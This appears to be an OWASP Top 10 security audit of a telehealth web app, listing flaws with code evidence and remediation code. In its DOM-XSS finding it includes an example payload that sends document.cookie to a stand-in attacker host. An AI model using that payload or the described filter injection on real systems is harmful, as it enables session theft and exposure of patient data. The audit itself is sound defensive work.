# Area D: Application Security Audit (OWASP Top 10)

**Reviewer:** Senior Application Security Engineer & Hostile Red-Teamer  
**Artifact:** `./audit/04-appsec.md`  
**Finding Severity:** CRITICAL (P0)

---

## 1. OWASP Top 10 Vulnerability Matrix

| OWASP Vulnerability | Identified in Codebase | Location (File:Line) | Risk Description |
| :--- | :--- | :--- | :--- |
| **A01: Broken Access Control** | **YES (CRITICAL)** | `supabase/schema.sql:140-169`, `src/app/admin/page.tsx:128` | All database tables are readable and writable by the anonymous public key (`USING (true)`). Admin route lacks server-side enforcement. |
| **A02: Cryptographic Failures** | **YES (HIGH)** | `src/lib/supabase.ts:3-4`, `src/app/telehealth/[roomId]/page.tsx:97` | Hardcoded fallback credentials in client bundle. Claims of "256-bit AES encryption" and "cryptographically locked" notes without backend crypto implementation. Insecure `Math.random` token generation. |
| **A03: Injection (PostgREST & XSS)** | **YES (CRITICAL)** | `src/app/telehealth/[roomId]/page.tsx:185`, `src/app/admin/page.tsx:456` | 1. PostgREST filter string interpolation of unvalidated route param (`roomId`).<br>2. Stored DOM-XSS via unescaped `printWindow.document.write` in GP Letter generator. |
| **A04: Insecure Design** | **YES (CRITICAL)** | Architecture-wide | Client-side trust model: client computes clinical severity scores and triggers alerts asynchronously. Failure states (dropped connection, closed tab) fail silently. |
| **A05: Security Misconfiguration** | **YES (HIGH)** | Root config | No `next.config.ts` or `next.config.js` exists. Zero HTTP security headers (HSTS, CSP, X-Frame-Options, X-Content-Type-Options). No `robots.txt` blocking search crawlers from indexing private portals. |
| **A06: Vulnerable & Outdated Components** | **LOW / VERIFIED** | `package.json` | Next.js 16.0.0, React 19.0.0, Supabase JS 2.49.0. Modern core packages; `npm audit` should be scheduled regularly. |
| **A07: Identification & Auth Failures** | **YES (CRITICAL)** | `src/app/admin/page.tsx:176-209`, `src/app/portal/page.tsx:162` | "Clinician Fast-Unlock" creates client-side fake session. Magic link signup has no role verification. Portal allows arbitrary email lookup. |
| **A08: Software & Data Integrity Failures** | **YES (HIGH)** | `supabase/schema.sql:149, 159` | Form definitions and scoring rules in `mmh_forms` are writable by the public. An attacker can alter clinical scoring thresholds. |
| **A09: Security Logging & Monitoring Failures** | **YES (HIGH)** | Architecture-wide | No audit log for sensitive record access. Zero detection of mass data exfiltration via anon key. False alert success reporting (`alert_dispatched: true`). |
| **A10: Server-Side Request Forgery (SSRF)** | **MEDIUM / UNVERIFIED** | `/api/alerts/clinician/route.ts:51`, `/api/webhooks/intake/route.ts:44` | Server executes `fetch()` to `ANTIGRAVITY_MARKETING_WEBHOOK_URL`. While currently configured via environment variable, lacks URL scheme/host validation. |

---

## 2. In-Depth Technical Evidence

### 1. Stored DOM-XSS via GP Letter Print Window
**Location:** `src/app/admin/page.tsx:443-470`
```typescript
function handlePrintGpLetter() {
  const patientName = gpClientName || selectedApptForNote?.client_name || 'Patient';
  const doctorName = gpName || 'Referring General Practitioner';
  const clinicName = gpClinic || 'General Practice Clinic';
  ...
  printWindow.document.write(`
    <html>...
    <h2>Client: ${patientName}</h2>
    <p>Referring Doctor: ${doctorName}</p>
    <div>${gpLetterOutput}</div>
    ...</html>
  `);
}
```
**Mechanism:** An untrusted user inputs payload: `<img src=x onerror="fetch('https://attacker.com/steal?data='+document.cookie)">` in the Intake Name or GP Clinic field. When Luke reviews the intake and clicks *"Print RACGP Letterhead"*, the payload executes inside the clinician's browser session.

### 2. PostgREST Filter String Interpolation
**Location:** `src/app/telehealth/[roomId]/page.tsx:185`
```typescript
const { data: apptData } = await supabase
  .from('mmh_appointments')
  .select('*, service:mmh_services(*)')
  .or(`telehealth_room_id.eq.${roomId},id.eq.${roomId}`)
  .maybeSingle();
```
**Mechanism:** The `roomId` parameter is directly injected from `useParams()` into a raw PostgREST `.or(...)` filter string without alphanumeric regex validation. An attacker can pass URL-encoded filter operators to alter query logic.

### 3. Missing HTTP Security Headers & Search Engine Indexing
Because no `next.config.ts` or `next.config.js` exists in the repository:
1. `Strict-Transport-Security` (HSTS) is not enforced at the application layer.
2. `X-Frame-Options` is not set; the entire site (including booking and portal) can be framed in an iframe by third-party domains (Clickjacking).
3. `Content-Security-Policy` (CSP) is missing; third-party script injection is unconstrained.
4. `robots.txt` does not exist; web crawlers (Google, Bing, Common Crawl) will index `/admin`, `/portal`, `/telehealth`, and `/screeners`.

---

## 3. Required Specification for Fix (Area D)

1. **Create `next.config.ts` with Hardened Security Headers:**
   ```typescript
   import type { NextConfig } from 'next';
   const nextConfig: NextConfig = {
     async headers() {
       return [
         {
           source: '/(.*)',
           headers: [
             { key: 'X-Frame-Options', value: 'DENY' },
             { key: 'X-Content-Type-Options', value: 'nosniff' },
             { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
             { key: 'Permissions-Policy', value: 'camera=(self), microphone=(self), geolocation=()' },
             { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains; preload' }
           ]
         }
       ];
     }
   };
   export default nextConfig;
   ```
2. **Create `src/app/robots.ts`:**
   ```typescript
   import { MetadataRoute } from 'next';
   export default function robots(): MetadataRoute.Robots {
     return {
       rules: [
         {
           userAgent: '*',
           allow: ['/', '/contact', '/intake'],
           disallow: ['/admin', '/portal', '/telehealth/', '/screeners/', '/api/']
         }
       ]
     };
   }
   ```
3. **Remediate DOM-XSS in Print Output:**
   Replace raw string template concatenation in `document.write` with DOM element creation (`document.createElement`) and `textContent` assignment, or use a sanitized iframe layout.
4. **Sanitize Route Parameters:**
   Validate `roomId` using regex: `/^[a-zA-Z0-9_-]{8,64}$/` before passing to database queries.
